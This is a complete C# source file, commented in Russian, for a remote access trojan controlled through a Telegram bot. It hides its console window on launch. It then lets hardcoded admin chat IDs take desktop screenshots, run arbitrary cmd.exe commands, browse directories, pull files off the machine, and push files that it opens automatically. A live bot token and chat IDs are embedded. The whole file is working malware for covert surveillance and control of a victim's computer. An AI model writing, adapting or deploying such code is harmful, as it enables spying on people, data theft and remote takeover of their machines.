using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Polling;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    private static ITelegramBotClient botClient;
    private static string botToken = "7776938290:AAEWP37--eTQban7H1YvoI1g16cRRRx59B4";
    private static List<long> adminChatIds = new List<long> { 305696040, 1705409334 };
    private static string pcName = Environment.MachineName;
    private static Dictionary<long, string> selectedPc = new Dictionary<long, string>();
    private static Dictionary<string, int> pcNumbers = new Dictionary<string, int>();
    private static int nextPcNumber = 1;
    private static string instanceId = Guid.NewGuid().ToString("N").Substring(0, 8);

    static async Task Main(string[] args)
    {
        // Скрываем консоль
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // Инициализация бота
        Console.WriteLine("Инициализация бота...");
        botClient = new TelegramBotClient(botToken);
        var me = await botClient.GetMeAsync();
        Console.WriteLine($"Бот {me.Username} успешно запущен на компьютере {pcName} (ID: {instanceId})!");

        // Регистрируем текущий компьютер
        RegisterPc(pcName);

        var receiverOptions = new ReceiverOptions
        {
            AllowedUpdates = new[] { UpdateType.Message },
            ThrowPendingUpdates = true
        };

        botClient.StartReceiving(
            updateHandler: HandleUpdateAsync,
            pollingErrorHandler: HandlePollingErrorAsync,
            receiverOptions: receiverOptions,
            cancellationToken: CancellationToken.None
        );

        // Держим программу запущенной
        await Task.Delay(-1);
    }

    private static void RegisterPc(string pcName)
    {
        if (!pcNumbers.ContainsKey(pcName))
        {
            pcNumbers[pcName] = nextPcNumber++;
        }
    }

    private static async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
    {
        if (update.Message == null)
            return;

        if (!adminChatIds.Contains(update.Message.Chat.Id))
        {
            await botClient.SendTextMessageAsync(
                chatId: update.Message.Chat.Id,
                text: "У вас нет доступа к этому боту."
            );
            return;
        }

        // Обработка документов
        if (update.Message.Type == MessageType.Document)
        {
            try
            {
                var file = await botClient.GetFileAsync(update.Message.Document.FileId);
                string fileName = update.Message.Document.FileName;
                string filePath = Path.Combine(Path.GetTempPath(), fileName);

                using (var saveStream = new FileStream(filePath, FileMode.Create))
                {
                    await botClient.DownloadFileAsync(file.FilePath, saveStream);
                }

                // Автоматически открываем файл
                Process.Start(new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true
                });

                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Файл {fileName} успешно загружен и открыт"
                );
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при загрузке файла: {ex.Message}"
                );
            }
            return;
        }

        if (update.Message.Type != MessageType.Text)
            return;

        var message = update.Message.Text.ToLower();

        if (message == "/screenshot")
        {
            try
            {
                using (var bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (var graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                    }

                    using (var ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        ms.Position = 0;
                        await botClient.SendPhotoAsync(
                            chatId: update.Message.Chat.Id,
                            photo: new InputFileStream(ms, "screenshot.jpg"),
                            caption: $"Скриншот рабочего стола ({pcName})"
                        );
                    }
                }
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при создании скриншота: {ex.Message}"
                );
            }
        }
        else if (message == "/help")
        {
            await SendHelpMessage(update.Message.Chat.Id);
        }
        else if (message == "/pcs")
        {
            await SendPcList(update.Message.Chat.Id);
        }
        else if (message.StartsWith("/select "))
        {
            await SelectPc(update.Message.Chat.Id, message.Substring(8));
        }
        else if (message == "/start")
        {
            await SendHelpMessage(update.Message.Chat.Id);
        }
        else if (message.StartsWith("/cmd "))
        {
            if (!selectedPc.ContainsKey(update.Message.Chat.Id))
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: "Сначала выберите компьютер с помощью команды /select"
                );
                return;
            }

            if (selectedPc[update.Message.Chat.Id] != pcName)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: "Выбранный компьютер недоступен для выполнения команд"
                );
                return;
            }

            string command = message.Substring(5);
            try
            {
                var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {command}";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();
                await process.WaitForExitAsync();

                string result = string.IsNullOrEmpty(output) ? "Команда выполнена, но не вернула результат" : output;
                if (!string.IsNullOrEmpty(error))
                {
                    result += $"\nОшибка: {error}";
                }

                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Результат выполнения команды:\n```\n{result}\n```",
                    parseMode: ParseMode.Markdown
                );
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при выполнении команды: {ex.Message}"
                );
            }
        }
        else if (message.StartsWith("/ls"))
        {
            if (!selectedPc.ContainsKey(update.Message.Chat.Id))
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: "Сначала выберите компьютер с помощью команды /select"
                );
                return;
            }

            if (selectedPc[update.Message.Chat.Id] != pcName)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: "Выбранный компьютер недоступен для просмотра файлов"
                );
                return;
            }

            string path = message.Length > 3 ? message.Substring(4).Trim() : ".";
            try
            {
                // Нормализация пути
                if (path.StartsWith("\\") || path.StartsWith("/"))
                {
                    path = path.Substring(1);
                }
                path = path.Replace('/', '\\');

                if (!Directory.Exists(path))
                {
                    await botClient.SendTextMessageAsync(
                        chatId: update.Message.Chat.Id,
                        text: $"Директория не существует: {path}"
                    );
                    return;
                }

                var directories = Directory.GetDirectories(path);
                var files = Directory.GetFiles(path);

                var response = new System.Text.StringBuilder();
                response.AppendLine($"Содержимое {path}:");
                response.AppendLine("\nДиректории:");
                foreach (var dir in directories)
                {
                    response.AppendLine($"📁 {Path.GetFileName(dir)}");
                }
                response.AppendLine("\nФайлы:");
                foreach (var file in files)
                {
                    var fileInfo = new FileInfo(file);
                    response.AppendLine($"📄 {Path.GetFileName(file)} ({fileInfo.Length / 1024} KB)");
                }

                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: response.ToString()
                );
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при просмотре директории: {ex.Message}"
                );
            }
        }
        else if (message.StartsWith("/download "))
        {
            if (!selectedPc.ContainsKey(update.Message.Chat.Id))
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: "Сначала выберите компьютер с помощью команды /select"
                );
                return;
            }

            if (selectedPc[update.Message.Chat.Id] != pcName)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: "Выбранный компьютер недоступен для скачивания файлов"
                );
                return;
            }

            string filePath = message.Substring(9).Trim();
            try
            {
                // Нормализация пути
                if (filePath.StartsWith("\\") || filePath.StartsWith("/"))
                {
                    filePath = filePath.Substring(1);
                }
                filePath = filePath.Replace('/', '\\');
                
                if (!System.IO.File.Exists(filePath))
                {
                    await botClient.SendTextMessageAsync(
                        chatId: update.Message.Chat.Id,
                        text: $"Файл не существует: {filePath}"
                    );
                    return;
                }

                var fileInfo = new FileInfo(filePath);
                if (fileInfo.Length > 50 * 1024 * 1024) // 50MB limit
                {
                    await botClient.SendTextMessageAsync(
                        chatId: update.Message.Chat.Id,
                        text: "Файл слишком большой (максимум 50MB)"
                    );
                    return;
                }

                using (var stream = System.IO.File.OpenRead(filePath))
                {
                    await botClient.SendDocumentAsync(
                        chatId: update.Message.Chat.Id,
                        document: new InputFileStream(stream, Path.GetFileName(filePath)),
                        caption: $"Файл: {Path.GetFileName(filePath)}"
                    );
                }
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при скачивании файла: {ex.Message}"
                );
            }
        }
    }

    private static async Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
    {
        Console.WriteLine($"Ошибка при получении обновлений: {exception.Message}");
    }

    private static async Task SendPcList(long chatId)
    {
        var message = new System.Text.StringBuilder("Доступные компьютеры:\n");
        foreach (var pc in pcNumbers)
        {
            message.AppendLine($"{pc.Value}. {pc.Key} {(pc.Key == pcName ? "(текущий)" : "")}");
        }
        await botClient.SendTextMessageAsync(chatId, message.ToString());
    }

    private static async Task SelectPc(long chatId, string input)
    {
        if (int.TryParse(input, out int pcNumber))
        {
            var selectedPcName = pcNumbers.FirstOrDefault(x => x.Value == pcNumber).Key;
            if (selectedPcName != null)
            {
                if (selectedPcName == pcName)
                {
                    selectedPc[chatId] = selectedPcName;
                    await botClient.SendTextMessageAsync(chatId, $"Выбран компьютер: {selectedPcName} (№{pcNumber})");
                }
                else
                {
                    await botClient.SendTextMessageAsync(chatId, "Этот компьютер недоступен для управления.");
                }
            }
            else
            {
                await botClient.SendTextMessageAsync(chatId, "Компьютер с таким номером не найден.");
            }
        }
        else
        {
            await botClient.SendTextMessageAsync(chatId, "Пожалуйста, укажите номер компьютера.");
        }
    }

    private static async Task SendHelpMessage(long chatId)
    {
        string helpText = @"Доступные команды:
/screenshot - сделать скриншот рабочего стола
/pcs - показать список доступных компьютеров
/select <номер_компьютера> - выбрать компьютер для управления
/cmd <команда> - выполнить команду на выбранном компьютере
/ls [путь] - показать содержимое директории
/download <путь_к_файлу> - скачать файл
/help - показать это сообщение

Также вы можете отправить любой файл, и он будет автоматически открыт на целевом компьютере.";

        await botClient.SendTextMessageAsync(chatId, helpText);
    }
} 